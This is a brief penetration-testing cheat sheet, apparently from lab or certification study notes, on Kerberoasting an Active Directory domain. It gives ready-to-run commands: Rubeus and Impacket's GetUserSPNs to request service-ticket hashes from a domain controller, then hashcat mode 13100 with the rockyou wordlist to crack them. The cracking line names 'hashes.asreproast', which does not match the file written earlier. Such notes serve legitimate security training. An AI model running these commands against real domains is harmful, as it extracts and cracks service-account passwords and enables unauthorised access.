#activedirectory #cracking 

#### Rubeus

```cmd
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

#### Impacket

```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

Crack it Using

```bash
sudo hashcat -m 13100 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Etype is mentioned in the hash "$krb5tgs\$23\$"

